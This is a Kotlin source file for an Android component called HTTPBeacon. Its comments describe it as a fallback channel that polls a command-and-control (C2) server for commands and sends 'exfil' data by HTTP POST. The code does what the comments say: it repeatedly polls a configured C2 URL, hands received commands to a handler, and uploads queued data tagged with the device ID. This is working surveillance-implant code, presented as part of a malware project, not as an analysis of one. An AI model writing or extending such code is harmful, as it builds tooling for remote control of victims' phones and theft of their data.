// ============================================================
// FILE: android/app/src/main/java/com/xrc/comms/HTTPBeacon.kt
// ============================================================
package com.xrc.comms

import android.content.Context
import android.util.Log
import com.xrc.core.config.XrcConfig
import com.xrc.core.crypto.CryptoBox
import kotlinx.coroutines.*
import okhttp3.*

/**
 * HTTPBeacon — HTTP long-polling fallback channel.
 *
 * Used when WebSocket and DNS are both unavailable.
 * Polls the C2 server for pending commands and
 * sends queued data as POST requests.
 */
class HTTPBeacon(
    private val context: Context,
    private val config: XrcConfig,
    private val cryptoBox: CryptoBox
) {
    companion object {
        private const val TAG = "HTTPBeacon"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    private var running = false
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val mediaType = MediaType.parse("application/json")!!

    private var pendingQueue = mutableListOf<String>()

    /**
     * Start polling for commands.
     */
    fun start() {
        if (running) return
        running = true
        scope.launch {
            while (running) {
                poll()
                delay(config.channels.http_poll_interval_ms)
            }
        }
    }

    /**
     * Send an exfil message via HTTP POST.
     */
    fun send(message: Message): Boolean {
        return try {
            val url = "${config.c2.http_url}/device/message"
            val body = RequestBody.create(mediaType, message.serialize())
            val request = Request.Builder()
                .url(url)
                .post(body)
                .addHeader("X-Device-Id", Identity.getDeviceId(context))
                .addHeader("Content-Type", "application/json")
                .build()

            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: Exception) {
            Log.w(TAG, "HTTP send failed: ${e.message}")
            false
        }
    }

    /**
     * Enqueue a message for next poll cycle.
     */
    fun enqueue(message: Message) {
        synchronized(pendingQueue) {
            pendingQueue.add(message.serialize())
            if (pendingQueue.size > 200) {
                pendingQueue.removeAt(0)
            }
        }
    }

    private fun poll() {
        try {
            val deviceId = Identity.getDeviceId(context)
            val url = "${config.c2.http_url}/device/poll?id=$deviceId"

            val request = Request.Builder()
                .url(url)
                .get()
                .addHeader("X-Device-Id", deviceId)
                .build()

            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body()?.string()
                if (!body.isNullOrEmpty()) {
                    handleResponse(body)
                }
            }
        } catch (e: Exception) {
            Log.v(TAG, "HTTP poll failed: ${e.message}")
        }
    }

    private fun handleResponse(body: String) {
        // Process any pending commands from server
        try {
            val msg = Protocol.json.decodeFromString<Message>(body)
            // Forward to message handler
            onMessage?.invoke(msg)
        } catch (e: Exception) {
            Log.w(TAG, "Invalid poll response: ${e.message}")
        }

        // Flush pending queue
        synchronized(pendingQueue) {
            val queue = pendingQueue.toList()
            pendingQueue.clear()
            for (data in queue) {
                sendRaw(data)
            }
        }
    }

    private fun sendRaw(data: String) {
        try {
            val url = "${config.c2.http_url}/device/message"
            val body = RequestBody.create(mediaType, data)
            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: java.io.IOException) {}
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.w(TAG, "Send raw failed: ${e.message}")
        }
    }

    var onMessage: ((Message) -> Unit)? = null

    fun isRunning(): Boolean = running
    fun stop() { running = false; scope.cancel() }
}
